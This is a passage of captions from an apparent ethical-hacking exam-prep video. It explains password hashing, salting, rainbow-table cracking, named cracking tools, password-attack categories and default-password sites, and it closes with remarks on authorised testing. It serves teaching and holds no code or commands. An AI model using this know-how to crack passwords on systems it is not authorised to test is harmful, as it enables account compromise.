00:07:31.180\nWell a group of somebody's actually as\nit turns out was able to get in and\n\n177\n00:07:31.180 --> 00:07:32.760\ndump the password file.\n\n178\n00:07:32.760 --> 00:07:35.530\nBut what they really dump was\nall the hashes of the password.\n\n179\n00:07:35.530 --> 00:07:39.310\nAnd then they posted it on the internet\nand you were able to look up your hash in\n\n180\n00:07:39.310 --> 00:07:43.430\na rainbow table and figure out whether or\nnot your password was compromised.\n\n181\n00:07:43.430 --> 00:07:44.670\nYou keep up with the news.\n\n182\n00:07:44.670 --> 00:07:45.470\nI know you do.\n\n183\n00:07:45.470 --> 00:07:49.426\nTwitter was hacked recently, the last ten\ndays or so, two weeks, whatever it was.\n\n184\n00:07:49.426 --> 00:07:53.070\nAnd all the Twitter accounts,\na lot of them anyway, had their hashes or\n\n185\n00:07:53.070 --> 00:07:55.522\ntheir passwords through\nhashes compromised.\n\n186\n00:07:55.522 --> 00:07:56.804\nAnd again, the same idea.\n\n187\n00:07:56.804 --> 00:07:59.492\nWhat you have to understand\nis that we don't often really\n\n188\n00:07:59.492 --> 00:08:01.009\nstore passwords as passwords.\n\n189\n00:08:01.009 --> 00:08:03.780\nPeople really misunderstand this and\ndon't realize this.\n\n190\n00:08:03.780 --> 00:08:08.390\nWhen we talk about security,\nwe talk about how we authenticate, and\n\n191\n00:08:08.390 --> 00:08:10.100\nhow we compromise passwords.\n\n192\n00:08:10.100 --> 00:08:13.915\nWhat we're doing back and forth as we send\npasswords and user names across the wire,\n\n193\n00:08:13.915 --> 00:08:17.930\nis we're actually sending a hash of\nthat information more often than not.\n\n194\n00:08:17.930 --> 00:08:21.780\nAnd as a result, we're not exposing\nthe password or user name directly.\n\n195\n00:08:21.780 --> 00:08:24.800\nWe're keeping it secure because we're not\ngiving direct knowledge of it through\n\n196\n00:08:24.800 --> 00:08:28.390\na transmission that can be\ncompromised by a bad actor.\n\n197\n00:08:28.390 --> 00:08:32.720\nRather, what we're doing is sending\na cryptographic representation of it.\n\n198\n00:08:32.720 --> 00:08:36.895\nIn a nonsensical form, a form that doesn't\nequate to the username and password,\n\n199\n00:08:36.895 --> 00:08:41.650\nbecause it really is very hard, almost\nimpossible, to reverse engineer that and\n\n200\n00:08:41.650 --> 00:08:46.900\nmake it equal the password unless you are\nsmart and do one of the following things.\n\n201\n00:08:46.900 --> 00:08:50.080\nIf you are smart and prevent this from\nhappening by using something called\n\n202\n00:08:50.080 --> 00:08:53.730\nsalting, we'll talking about that in a\nminute what that is, then you're applying\n\n203\n00:08:53.730 --> 00:08:57.050\na countermeasure that makes it that much\ntougher for the bad actor to do their job.\n\n204\n00:08:57.050 --> 00:08:59.898\nBut if the bad actor is smart and\nyou don't salt your hash,\n\n205\n00:08:59.898 --> 00:09:03.344\nbecause you want salty hash,\nthat's always a good important thing.\n\n206\n00:09:03.344 --> 00:09:04.393\n>> [LAUGH]\n>> You know,\n\n207\n00:09:04.393 --> 00:09:07.789\nyou can take this conversation in so\nmany directions that are just evil and\n\n208\n00:09:07.789 --> 00:09:08.905\njust not appropriate.\n\n209\n00:09:08.905 --> 00:09:09.629\n>> [LAUGH]\n>> And\n\n210\n00:09:09.629 --> 00:09:11.468\nit doesn't mean that at all by the way.\n\n211\n00:09:11.468 --> 00:09:14.697\nBut, we're just simply talking\nabout taking your passwords and\n\n212\n00:09:14.697 --> 00:09:18.393\nwhen you store them as a hash, adding\na random string to them, which is what\n\n213\n00:09:18.393 --> 00:09:22.520\nthe salt implies in the beginning to\nmake it harder to reverse engineer them.\n\n214\n00:09:22.520 --> 00:09:24.710\nBut when you say it like that,\nit's not as fun or as exciting,\n\n215\n00:09:24.710 --> 00:09:26.750\nas cool as saying you have a salty hash.\n\n216\n00:09:26.750 --> 00:09:29.063\n>> [LAUGH]\n>> Cuz that just is something different.\n\n217\n00:09:29.063 --> 00:09:30.680\nAnyway, so we wanna salt our hashes.\n\n218\n00:09:30.680 --> 00:09:34.385\nBut if you're not doing that and\nthe bad actor gets up to no good, and\n\n219\n00:09:34.385 --> 00:09:38.611\nis able to capture through network\nmonitoring, the hash, the string that is\n\n220\n00:09:38.611 --> 00:09:42.398\ngoing back and forth to represent\nthe password, they can take that.\n\n221\n00:09:42.398 --> 00:09:46.030\nThey could then go out, get themselves\na password cracking program.\n\n222\n00:09:46.030 --> 00:09:49.240\nLOpht Crack, Cain and Abel, Ophcrack.\n\n223\n00:09:49.240 --> 00:09:51.281\nIf you would prefer to use\nOphcrack instead of LOpht crack.\n\n224\n00:09:51.281 --> 00:09:53.550\nThere's all sorts of\ndifferent variants out there.\n\n225\n00:09:53.550 --> 00:09:55.450\nPW Dump, PW Dump version 2,\n\n226\n00:09:55.450 --> 00:09:59.180\nJack the Ripper, all sorts of\ndifferent ones, I can go on and on.\n\n227\n00:09:59.180 --> 00:10:02.310\nThere's a million of them out there,\nbut you can get any of these.\n\n228\n00:10:02.310 --> 00:10:06.900\nYou can load up either a dictionary table\nor dictionary word list, rather, so\n\n229\n00:10:06.900 --> 00:10:08.820\nyou can just do a brute force attack.\n\n230\n00:10:08.820 --> 00:10:12.330\nBut you could also load up a rainbow table\nand you can scan the hashes and try to\n\n231\n00:10:12.330 --> 00:10:15.110\nfigure out, through a quick comparison,\nwhether or not you have a match.\n\n232\n00:10:15.110 --> 00:10:19.580\nIf you have a match to the hash, that\nhash is translated in the rainbow table,\n\n233\n00:10:19.580 --> 00:10:21.417\nessentially telling us\nwhat the device is or\n\n234\n00:10:21.417 --> 00:10:24.140\nthe item is that created\nthe hash in the first place.\n\n235\n00:10:24.140 --> 00:10:25.790\nAnd a result of that we\nknow what the password is,\n\n236\n00:10:25.790 --> 00:10:27.900\nwithout ever having to guess\nthe password directly.\n\n237\n00:10:27.900 --> 00:10:28.640\nWe get the hash.\n\n238\n00:10:28.640 --> 00:10:32.458\nSo, I know Mike actually went out and\ndid a little research for us online,\n\n239\n00:10:32.458 --> 00:10:36.660\nfound a rainbow table or two that we could\njust look at for comparative purposes.\n\n240\n00:10:36.660 --> 00:10:39.190\nSo, if you look at Mike's machine,\nwhich you can see there.\n\n241\n00:10:39.190 --> 00:10:40.660\nWe have a list of rainbow tables.\n\n242\n00:10:40.660 --> 00:10:44.830\nYou can find these on any corner website\nanywhere in the world I would think.\n\n243\n00:10:44.830 --> 00:10:46.570\nPretty common out on the Internet.\n\n244\n00:10:46.570 --> 00:10:49.490\nThe thing about them is that you can\nget all sorts of different ones.\n\n245\n00:10:49.490 --> 00:10:51.540\nYou can see there are LM LAN manager.\n\n246\n00:10:51.540 --> 00:10:53.300\nNTLM NT LAN manager.\n\n247\n00:10:53.300 --> 00:10:54.804\nThere are MD5 rainbow tables.\n\n248\n00:10:54.804 --> 00:10:59.287\nDifferent hashes are gonna\nbe made by different,\n\n249\n00:10:59.287 --> 00:11:02.283\nthe thing that makes the hashes.\n\n250\n00:11:02.283 --> 00:11:03.475\n>> The hashing algorithms.\n\n251\n00:11:03.475 --> 00:11:04.100\n>> There you go.\n\n252\n00:11:04.100 --> 00:11:05.100\nThe algorithm, right?\n\n253\n00:11:05.100 --> 00:11:08.660\nThe mathematical thingy that we use to\ndo that thing, whatever that is, yes.\n\n254\n00:11:08.660 --> 00:11:12.100\nTry not to talk, grab a breath, and\n\n255\n00:11:12.100 --> 00:11:14.010\nthink at the same time,\nit clearly does not work.\n\n256\n00:11:14.010 --> 00:11:15.940\nAt least not for me,\nit's not working well today.\n\n257\n00:11:15.940 --> 00:11:17.550\nSo yeah, so I was thinking\nabout the algorithms, right?\n\n258\n00:11:17.550 --> 00:11:19.280\nSo, the different\nalgorithms that are used.\n\n259\n00:11:19.280 --> 00:11:20.800\nAnd you can see then,\nin this particular site,\n\n260\n00:11:20.800 --> 00:11:23.170\nwhichever one it is,\nthere are different algorithms and\n\n261\n00:11:23.170 --> 00:11:27.010\ndifferent versions of hashes listed for\nrainbow tables, based on that.\n\n262\n00:11:27.010 --> 00:11:29.526\nAnd we would go and\ndownload the appropriate one and\n\n263\n00:11:29.526 --> 00:11:33.637\nsay, I want an NTLM rainbow table hash\nfor, you know, x or y, grab that file.\n\n264\n00:11:33.637 --> 00:11:34.856\nSome are small, some are big.\n\n265\n00:11:34.856 --> 00:11:37.062\nYou gotta be careful some are really big.\n\n266\n00:11:37.062 --> 00:11:37.690\n>> Yep.\n>> And\n\n267\n00:11:37.690 --> 00:11:39.040\nyou always got to check the download size.\n\n268\n00:11:39.040 --> 00:11:42.220\nSome of these are gigabytes in size or\nbigger, right.\n\n269\n00:11:42.220 --> 00:11:44.740\nAnd so you download them and\nthen you simply load them into the tool.\n\n270\n00:11:44.740 --> 00:11:46.930\nAnd you do a quick yes no comparison.\n\n271\n00:11:46.930 --> 00:11:48.878\nAnd then you find a match,\nding, ding, ding, right?\n\n272\n00:11:48.878 --> 00:11:51.173\nYou are a winner, and as a result of that,\n\n273\n00:11:51.173 --> 00:11:54.066\nyeah that one's almost a terabyte in size,\nright?\n\n274\n00:11:54.066 --> 00:11:56.220\nIt's probably everything you ever\nwanted to know about hashes but\n\n275\n00:11:56.220 --> 00:11:56.960\nwere afraid to ask.\n\n276\n00:11:56.960 --> 00:12:00.440\n>> Well, depending if you know your length\nyou can do one through seven characters.\n\n277\n00:12:00.440 --> 00:12:02.840\nThis is one through nine, upper and lower.\n\n278\n00:12:02.840 --> 00:12:05.540\n>> So it's gonna have a whole bunch\nof stuff in there absolutely.\n\n279\n00:12:05.540 --> 00:12:06.360\nSo, you just wanna be careful,\n\n280\n00:12:06.360 --> 00:12:08.590\nthat's almost a terabyte\nof information right there.\n\n281\n00:12:08.590 --> 00:12:10.970\nBut we use these to then be\nable to essentially go in and\n\n282\n00:12:10.970 --> 00:12:11.900\ndo password cracking.\n\n283\n00:12:11.900 --> 00:12:14.670\nSo you wanna make sure you're aware\nof that, we recover passwords,\n\n284\n00:12:14.670 --> 00:12:17.440\nobviously, and we can do that,\nand that's gonna be important.\n\n285\n00:12:17.440 --> 00:12:22.340\nA lot of these tools will very quickly be\nable to run through, even a list that size\n\n286\n00:12:22.340 --> 00:12:25.760\nin a couple of minutes, because\nthere's looking for a string match.\n\n287\n00:12:25.760 --> 00:12:27.040\n>> Right.\n>> It's very, very straight forward and\n\n288\n00:12:27.040 --> 00:12:27.540\neasy to do.\n\n289\n00:12:27.540 --> 00:12:31.200\nThe minute they find it, that is\nthan gonna equal the comparison and\n\n290\n00:12:31.200 --> 00:12:34.500\nthen tell us what that essentially\nequivalent is and it translates to.\n\n291\n00:12:34.500 --> 00:12:36.510\nSo, wanna make sure we know about this.\n\n292\n00:12:36.510 --> 00:12:39.150\nSo we can do these kinds of attacks.\n\n293\n00:12:39.150 --> 00:12:42.270\nWe call these attacks\nwhile we're doing them.\n\n294\n00:12:42.270 --> 00:12:45.180\nAnd using things like rainbow\ntables to do this kind of crack.\n\n295\n00:12:45.180 --> 00:12:46.740\nAnd we call them offline attacks.\n\n296\n00:12:46.740 --> 00:12:51.030\nThey're being done not online, not in real\ntime, not against the live database, but\n\n297\n00:12:51.030 --> 00:12:53.540\nrather they're being done\nthrough a third-party piece of\n\n298\n00:12:53.540 --> 00:12:57.480\nsoftware on your local machine with\na file after you gather that information.\n\n299\n00:12:57.480 --> 00:12:58.990\nSo that's an offline attack.\n\n300\n00:12:58.990 --> 00:13:04.030\nWe may be doing non-electronic attacks\nwhere we're just guessing the password.\n\n301\n00:13:04.030 --> 00:13:08.168\nSomebody is there, and we're trying\nto go in and do dumpster diving.\n\n302\n00:13:08.168 --> 00:13:12.230\nSocial engineering, shoulder surfing,\nwe're just seeing and observing and\n\n303\n00:13:12.230 --> 00:13:15.390\ntrying to get in and go, yeah, that's\nthe password and then we go, we put it in.\n\n304\n00:13:15.390 --> 00:13:18.094\nWe can active online attacks so\nmaybe doing brute forcing,\n\n305\n00:13:18.094 --> 00:13:21.435\ndictionary attacks, as I mentioned,\nfall into this category.\n\n306\n00:13:21.435 --> 00:13:27.395\nPassive online attacks, session replay\nattacks, wire sniffing, where we're\n\n307\n00:13:27.395 --> 00:13:31.245\nlooking to try to capture the password in\nthe clear and then just simply put it in.\n\n308\n00:13:31.245 --> 00:13:34.292\nSo, there's different categories of\nattacks that we would engage in here.\n\n309\n00:13:34.292 --> 00:13:37.997\nYou should definitely, if you're preparing\nfor the exam, wanna know these different\n\n310\n00:13:37.997 --> 00:13:43.537\ncategories of attacks, non-electronic,\nactive online, passive online, offline.\n\n311\n00:13:43.537 --> 00:13:47.197\nAnd I gave you a couple of examples of\neach kind of activity that would fall into\n\n312\n00:13:47.197 --> 00:13:49.497\nthose kinds of categorizations.\n\n313\n00:13:49.497 --> 00:13:50.647\nBe helpful to mix and match.\n\n314\n00:13:50.647 --> 00:13:54.797\nI could definitely envision in my mind\nseveral ways to ask questions like this.\n\n315\n00:13:54.797 --> 00:13:58.587\nOne of them may be, hey I've got a list of\nactivities in one pic list on the left or\n\n316\n00:13:58.587 --> 00:13:59.340\non the right.\n\n317\n00:13:59.340 --> 00:14:03.615\nGot a list of different types of password\nattack categories on the right, you know,\n\n318\n00:14:03.615 --> 00:14:06.700\ndrag the appropriate activity\nunder the appropriate category and\n\n319\n00:14:06.700 --> 00:14:07.660\ndrop them in there so\n\n320\n00:14:07.660 --> 00:14:12.460\nwe know you know that precomputered\nhash rainbow tables are gonna be offline\n\n321\n00:14:12.460 --> 00:14:16.262\nattacks whereas shoulder surfing\nis a non-electronic attack, right.\n\n322\n00:14:16.262 --> 00:14:19.150\nSo wanna be thinking about that,\nand that may be one way.\n\n323\n00:14:19.150 --> 00:14:21.760\nI can think of lots of ways to ask\nthis question, by the way, but\n\n324\n00:14:21.760 --> 00:14:24.718\nthat's just one of the ones that I,\nif I was writing the questions, and\n\n325\n00:14:24.718 --> 00:14:26.473\nthankfully for you I'm not, by the way.\n\n326\n00:14:26.473 --> 00:14:27.838\n>> [LAUGH]\n>> But if I was,\n\n327\n00:14:27.838 --> 00:14:29.817\nboy would you be in trouble.\n\n328\n00:14:29.817 --> 00:14:32.199\nI can think or multiple ways to\nask a question like this, right?\n\n329\n00:14:32.199 --> 00:14:33.840\nSo, it's important to be aware of that.\n\n330\n00:14:33.840 --> 00:14:34.821\nSo we want to just be aware of\n\n331\n00:14:34.821 --> 00:14:36.886\nthe fact that we can do a variety\nof these things, right?\n\n332\n00:14:36.886 --> 00:14:41.210\nAnd there are many tools out there,\nas I said, that are very good for this.\n\n333\n00:14:41.210 --> 00:14:43.680\nWe also have sites that\nmake it very easy for\n\n334\n00:14:43.680 --> 00:14:45.320\nus to guess default passwords and\nfind them.\n\n335\n00:14:45.320 --> 00:14:46.720\nWe've talked about this before, and\n\n336\n00:14:46.720 --> 00:14:51.870\nthe fact that if you're not changing\nout those SNMP community strings.\n\n337\n00:14:51.870 --> 00:14:53.265\nI was about to be like you and say SMTP.\n\n338\n00:14:53.265 --> 00:14:55.018\n>> [LAUGH]\n>> When I meant SNMP.\n\n339\n00:14:55.018 --> 00:14:58.682\nSo SNMP community strings, or\ndefault configs, or default passwords,\n\n340\n00:14:58.682 --> 00:15:00.000\nthat can be an issue.\n\n341\n00:15:00.000 --> 00:15:02.420\nI know that you've put up\na couple of sites for us as well.\n\n342\n00:15:02.420 --> 00:15:05.927\nSo a default password site, and\nthere are many of them, by the way.\n\n343\n00:15:05.927 --> 00:15:08.710\nA little word of caution here,\nI know Mike's told you about this before.\n\n344\n00:15:08.710 --> 00:15:10.902\nSome of these sites\nare perfectly legitimate,\n\n345\n00:15:10.902 --> 00:15:14.598\nthey're gonna give you good information,\nothers are rife with malware.\n\n346\n00:15:14.598 --> 00:15:17.670\nAnd you wanna be aware of that and\nwe can't warranty or\n\n347\n00:15:17.670 --> 00:15:21.915\ntell you anything will or will not\nbe free of information compromise,\n\n348\n00:15:21.915 --> 00:15:25.525\nmeaning, there's always the possibility\nthat a good site today gets taken over and\n\n349\n00:15:25.525 --> 00:15:26.885\nturns into a bad site tomorrow.\n\n350\n00:15:26.885 --> 00:15:30.145\nSo, you really gotta exercise a little\nmore due diligence, due care and\n\n351\n00:15:30.145 --> 00:15:34.270\ncaution with the information we're giving\nyou here in general, then what you may do\n\n352\n00:15:34.270 --> 00:15:39.200\nin some our other shows in other topics\nwhere we're talking about, I don't know,\n\n353\n00:15:39.200 --> 00:15:40.500\nCasp for instance, right?\n\n354\n00:15:40.500 --> 00:15:43.839\nWith CompTIA, where we went through and\nwe talked about security stuff and\n\n355\n00:15:43.839 --> 00:15:46.712\nwe told you about websites, but\nthey were pretty safe, right?\n\n356\n00:15:46.712 --> 00:15:47.355\n>> Mm-hm.\n\n357\n00:15:47.355 --> 00:15:48.390\n>> Pretty good sites.\n\n358\n00:15:48.390 --> 00:15:51.784\nSome of these sites are sites that\nsit on the edge of the dark web and\n\n359\n00:15:51.784 --> 00:15:54.941\ndabble in dark arts as well as\ndabbling in good information.\n\n360\n00:15:54.941 --> 00:15:56.877\nA little mixture of both,\nin other words, right?\n\n361\n00:15:56.877 --> 00:15:58.582\nAnd so you gotta be really careful.\n\n362\n00:15:58.582 --> 00:16:01.823\nI would never go out to any of these sites\nunless I'm running several different virus\n\n363\n00:16:01.823 --> 00:16:03.252\nand malware scanners on my machine.\n\n364\n00:16:03.252 --> 00:16:03.956\n>> Yes.\n>> And\n\n365\n00:16:03.956 --> 00:16:08.245\nI want to have active security running\nin the background in real time.\n\n366\n00:16:08.245 --> 00:16:09.730\nLooking at what's happening.\n\n367\n00:16:09.730 --> 00:16:13.800\nA lot of times I'll go to these sites\ndoing research or working on a customer's\n\n368\n00:16:13.800 --> 00:16:17.730\nissues and concerns and I will be getting\nhammered with all sorts of stuff.\n\n369\n00:16:17.730 --> 00:16:21.590\nAnd I often will use throw away machines\nor VM Machines, virtual machines that I\n\n370\n00:16:21.590 --> 00:16:24.510\ncan just simply get rid of so\nI don't have to worry about this.\n\n371\n00:16:24.510 --> 00:16:27.440\nBecause the problem is that you will\nvery quickly infect yourself if\n\n372\n00:16:27.440 --> 00:16:28.060\nyou're not careful.\n\n373\n00:16:28.060 --> 00:16:31.540\nSo, you're just like everything else,\nright, buyer beware.\n\n374\n00:16:31.540 --> 00:16:34.950\nYou have to know that a lot of the\nknowledge we give you is very valuable.\n\n375\n00:16:34.950 --> 00:16:38.900\nBut a lot of the places you go to gain it\nmay actually be rife with booby traps and\n\n376\n00:16:38.900 --> 00:16:40.610\nyou got to be real careful\nabout that in this world.\n\n377\n00:16:40.610 --> 00:16:43.430\nSo just a big disclaimer\nword of warning from you.\n\n378\n00:16:43.430 --> 00:16:45.980\nDon't want to ever hear from somebody\nlater that says hey Mike and\n\n379\n00:16:45.980 --> 00:16:48.600\nAdam said go to this site I went\nthere they blew my machine up.\n\n380\n00:16:48.600 --> 00:16:51.280\nYou know, sorry about that,\nwe definitely don't want to\n\n381\n00:16:51.280 --> 00:16:53.660\nhappen we're not kidding around\nabout that being very serious.\n\n382\n00:16:53.660 --> 00:16:56.840\nBut you know you gotta understand that\nsome of this stuff can get you in trouble.\n\n383\n00:16:56.840 --> 00:16:59.050\nYou gotta exercise caution right so\njust be aware on that.\n\n384\n00:16:59.050 --> 00:17:01.380\nSo We got all these sites\nwhere you can go find them.\n\n385\n00:17:01.380 --> 00:17:05.730\nThe value of a site like that is that\nwhat a lot of times is posted there\n\n386\n00:17:05.730 --> 00:17:09.670\nis manufacturer default settings,\nmanufacturer password settings.\n\n387\n00:17:09.670 --> 00:17:12.925\nAnd you get a list of that stuff,\nand you go and start probing and\n\n388\n00:17:12.925 --> 00:17:16.695\ndoing the enumerating, the fingerprinting,\nscanning, all stuff that we've done\n\n389\n00:17:16.695 --> 00:17:19.745\nthat we've talked about, the foot\nprinting and all that kind of stuff.\n\n390\n00:17:19.745 --> 00:17:22.925\nAnd then you find, look,\nthere's a Cisco Router sitting over there,\n\n391\n00:17:22.925 --> 00:17:26.705\nit's an ASA firewall, or\na firewall, or this kind of IDS, or\n\n392\n00:17:26.705 --> 00:17:29.090\nthis kind of router, whoever, whatever.\n\n393\n00:17:29.090 --> 00:17:31.620\nAnd you may be able to find,\nlook it's on this list,\n\n394\n00:17:31.620 --> 00:17:34.570\nif it's set up the right way and\nit's defaulted it would be this.\n\n395\n00:17:34.570 --> 00:17:37.450\nAnd as silly as it is you sit there and\ntry it and five,\n\n396\n00:17:37.450 --> 00:17:39.370\nsix times out of ten you get in.\n\n397\n00:17:39.370 --> 00:17:42.630\nAnd as a result it makes your\njob a lot easier as a bad actor.\n\n398\n00:17:42.630 --> 00:17:45.730\nMakes our job a lot tougher as\nethical hackers because now\n\n399\n00:17:45.730 --> 00:17:49.460\nwe got to defend against them not just\nthe bad people but the stupid people.\n\n400\n00:17:49.460 --> 00:17:52.400\nAnd it's the bad people plus the stupid\npeople together that really make our\n\n401\n00:17:52.400 --> 00:17:53.390\nlife difficult.\n\n402\n00:17:53.390 --> 00:17:57.810\nIf we can compromise a system because\nof a default setting then that's just\n\n403\n00:17:57.810 --> 00:18:01.390\nplain old fashioned no other way to put\nit just you know bad administration.\n\n404\n00:18:01.390 --> 00:18:04.070\nYou're just not doing your job\nyou're not exercising due care.\n\n405\n00:18:04.070 --> 00:18:05.910\nYou're not exercising due diligence.\n\n406\n00:18:05.910 --> 00:18:08.920\nYou're not taking the default settings and\nmanipulating them and\n\n407\n00:18:08.920 --> 00:18:12.360\nmodifying since you're not making it\nsuper easy for somebody to come in and\n\n408\n00:18:12.360 --> 00:18:13.970\ntake that system away from you.\n\n409\n00:18:13.970 --> 00:18:14.980\nAnd you're supposed to do that.\n\n410\n00:18:14.980 --> 00:18:17.460\nThat's part of what you gotta\ndo as an ethical hacker is\n\n411\n00:18:17.460 --> 00:18:19.330\nmake sure that kind of\nstuff's not happening.\n\n412\n00:18:19.330 --> 00:18:22.270\nSo you gotta go in and use this\nknowledge to understand what happens.\n\n413\n00:18:22.270 --> 00:18:26.990\nUse it to test your systems and say hey\ndo we have systems that are a default?\n\n414\n00:18:26.990 --> 00:18:29.890\nRemember a lot of the times these systems\nare maintained by other teams and\n\n415\n00:18:29.890 --> 00:18:30.660\nother entities right?\n\n416\n00:18:30.660 --> 00:18:34.530\nYou know there may be a network\ngroup that maintains all the routers\n\n417\n00:18:34.530 --> 00:18:35.080\nand the switches.\n\n418\n00:18:35.080 --> 00:18:39.530\nThere may be a security group that\nmaintains firewalls and ids's and ips.\n\n419\n00:18:39.530 --> 00:18:43.620\nThat may not be you by the way,\nyou may not be a member of that team.\n\n420\n00:18:43.620 --> 00:18:46.390\nBut you may have to interact with them and\nprovide guidance or\n\n421\n00:18:46.390 --> 00:18:47.990\nyou may not even be invited to.\n\n422\n00:18:47.990 --> 00:18:49.520\nBut you should anyway.\n\n423\n00:18:49.520 --> 00:18:51.790\nAnd by the way this brings up\na really important concept,\n\n424\n00:18:51.790 --> 00:18:56.300\nwhich is as an ethical hacker,\nunderscore the word ethical, right?\n\n425\n00:18:56.300 --> 00:19:00.610\nAs an ethical hacker it's your\nresponsibility to report on weaknesses and\n\n426\n00:19:00.610 --> 00:19:02.860\nrisks that you find in the business.\n\n427\n00:19:02.860 --> 00:19:05.100\nLet me be clear though, because we\nhear this come up from time to time.\n\n428\n00:19:05.100 --> 00:19:07.280\nit is not your job to go out and\n\n429\n00:19:07.280 --> 00:19:12.100\nrandomly attack other networks that you\ndon't belong to or not authorized to use.\n\n430\n00:19:12.100 --> 00:19:13.330\nShowing them their weaknesses.\n\n431\n00:19:13.330 --> 00:19:14.417\nThat is not your job, right?\n\n432\n00:19:14.417 --> 00:19:17.070\n>> [LAUGH] Wait, wait,\nI can't get a job doing that?\n\n433\n00:19:17.070 --> 00:19:18.560\n>> Yeah, I know.\n>> Hack into somebody and\n\n434\n00:19:18.560 --> 00:19:20.160\nthen go show them that\nI hacked in to them?\n\n435\n00:19:20.160 --> 00:19:21.290\nThey're going to hire me, right?\n\n436\n00:19:21.290 --> 00:19:21.960\n>> For money, for money.\n\n437\n00:19:21.960 --> 00:19:25.090\n>> Look, I can fix your problems and\ncost you $50,000 but here's what I found.\n\n438\n00:19:25.090 --> 00:19:26.900\nAnd there are people,\nunfortunately all kidding aside,\n\n439\n00:19:26.900 --> 00:19:28.500\nthat have tried to do that over the years.\n\n440\n00:19:28.500 --> 00:19:29.670\nGive all of us a bad name.\n\n441\n00:19:29.670 --> 00:19:31.260\nIt's not appropriate and\nI know you know that.\n\n442\n00:19:31.260 --> 00:19:33.700\nI know you know that's not right,\nthat's not ethical.\n\n443\n00:19:33.700 --> 00:19:36.090\nIt's the exact opposite of what\nwe're talking about doing.\n\n444\n00:19:36.090 --> 00:19:37.060\nIt's unethical.\n\n445\n00:19:37.060 --> 00:19:38.030\nIt's inappropriate.\n\n446\n00:19:38.030 --> 00:19:41.240\nIt's just not the kind of behavior\nwe look for or that we condone or\n\n447\n00:19:41.240 --> 00:19:42.460\nthat NCE Council condones.\n\n448\n00:19:42.460 --> 00:19:44.090\nThey're very clear about that.\n\n449\n00:19:44.090 --> 00:19:46.200\nThat is not acceptable at all.\n\n450\n00:19:46.200 --> 00:19:50.040\nAnd you have to understand that you\nare given the right in your business by\n\n451\n00:19:50.040 --> 00:19:55.060\nsenior management to operate on behalf of\nthe business only at the request of those\n\n452\n00:19:55.060 --> 00:19:58.070\nstakeholders of those senior managers,\nwe've talked about this time and again.\n\n453\n00:19:58.070 --> 00:20:00.630\nYou can go out internally and look for\n\n454\n00:20:00.630 --> 00:20:03.260\nweaknesses by doing things\nthat are non-invasive.\n\n455\n00:20:03.260 --> 00:20:06.190\nBut if you find those weaknesses\nbefore you can act on them,\n\n456\n00:20:06.190 --> 00:20:08.930\nyou must go report them and\nseek permission to remediate.\n\n457\n00:20:08.930 --> 00:20:12.720\nUnless you're already in the position, you\ndon't have the right to just go off and\n\n458\n00:20:12.720 --> 00:20:14.050\nfix problems on your own.\n\n459\n00:20:14.050 --> 00:20:14.890\nIn other words what I'm,\n>> Right.\n\n460\n00:20:14.890 --> 00:20:17.600\n>> suggesting to you unless you've\ngotten permission to do so.\n\n461\n00:20:17.600 --> 00:20:22.390\nIf you are the c level executive in\ncharge of this stuff and you do some you\n\n462\n00:20:22.390 --> 00:20:25.870\nknow snooping on your own you figure it\nout you have the power and the right to\n\n463\n00:20:25.870 --> 00:20:29.350\ntell your team go fix it because that's\nyour role and I'm fine with that.\n\n464\n00:20:29.350 --> 00:20:31.840\nYou know when I get hired by\na business to do this kind of stuff,\n\n465\n00:20:31.840 --> 00:20:35.110\nthat's my talk track up front,\nI'm like, okay, let's be clear.\n\n466\n00:20:35.110 --> 00:20:38.680\nWho's calling the shots, who do I report\nto, who do I say, this is what you have to\n\n467\n00:20:38.680 --> 00:20:42.430\ndo, and when I find it, do I have\nthe right on the spot to make that\n\n468\n00:20:42.430 --> 00:20:47.130\ndetermination and to tell people that I'm\nworking with, we should remediate this?\n\n469\n00:20:47.130 --> 00:20:49.740\nOr do you have The final authority.\n\n470\n00:20:49.740 --> 00:20:54.170\nAnd if it's a significant zero\nday problem do I have the right\n\n471\n00:20:54.170 --> 00:20:57.660\nto be able to tell them that these are the\ntwo steps we have to take immediately,\n\n472\n00:20:57.660 --> 00:20:59.510\nand then we have to go report right away.\n\n473\n00:20:59.510 --> 00:21:02.020\nYou know in other words let's talk about\nthe rules of engagement is what I'm\n\n474\n00:21:02.020 --> 00:21:06.260\nsuggesting to you right, because we\nmay find things that are hypercritical\n\n475\n00:21:06.260 --> 00:21:07.610\nproblems in your infrastructure,\n\n476\n00:21:07.610 --> 00:21:11.180\nand if they're not dealt with,\nthey could lead to compromise immediately.\n\n477\n00:21:11.180 --> 00:21:14.330\nI'm not suggesting that we just run around\nwith our heads cut off and say my God.\n\n478\n00:21:14.330 --> 00:21:15.420\nDo you remember the little [LAUGH]-\n>> [LAUGH]\n\n479\n00:21:15.420 --> 00:21:17.040\n>> You remember we talked about Gru\n\n480\n00:21:17.040 --> 00:21:18.165\nin some of the other episodes, right?\n\n481\n00:21:18.165 --> 00:21:19.920\n>> Uh-huh.\n>> In Despicable Me?\n\n482\n00:21:19.920 --> 00:21:21.500\nYou remember the scene with the minions?\n\n483\n00:21:21.500 --> 00:21:24.200\nI think it's one of the trailers they\ndid for one of the other movies.\n\n484\n00:21:24.200 --> 00:21:25.830\nIt may be the one where\nthey have their own movie,\n\n485\n00:21:25.830 --> 00:21:28.580\nthe Minions movie, where the one,\nKevin or whatever the Minion is,\n\n486\n00:21:28.580 --> 00:21:32.890\nhas the fire siren on his head, he's\nwalking around making the siren noise.\n\n487\n00:21:32.890 --> 00:21:33.580\nYou know?\nAnd\n\n488\n00:21:33.580 --> 00:21:36.860\nhe's got the axe that he chops through\nthe walls and he's running around, right?\n\n489\n00:21:36.860 --> 00:21:38.480\nWe're not supposed to do that,\nas cute as that is.\n\n490\n00:21:38.480 --> 00:21:39.990\nYou're not supposed to do that, right?\n\n491\n00:21:39.990 --> 00:21:41.140\nWhat you have to do, right?\n\n492\n00:21:41.140 --> 00:21:43.560\nIs you have to tell somebody\nhey we have a problem.\n\n493\n00:21:43.560 --> 00:21:45.650\nLet's talk about how we\nare going to fix this, right?\n\n494\n00:21:45.650 --> 00:21:47.220\nAnd it's really important for\n\n495\n00:21:47.220 --> 00:21:52.170\nyou to understand that you've got to solve\nproblems to be good at what we do and and\n\n496\n00:21:52.170 --> 00:21:54.200\nyou know, sometimes,\nvery overwhelming, right?\n\n497\n00:21:54.200 --> 00:21:58.460\nThere are 1000 things going on and\nyou can't figure out where to begin.\n\n498\n00:21:58.460 --> 00:21:59.590\nStart somewhere, right?\n\n499\n00:21:59.590 --> 00:22:00.900\nEat the elephant one bite at at time.\n\n500\n00:22:00.900 --> 00:22:03.140\nSolve one problem and\nthen solve the 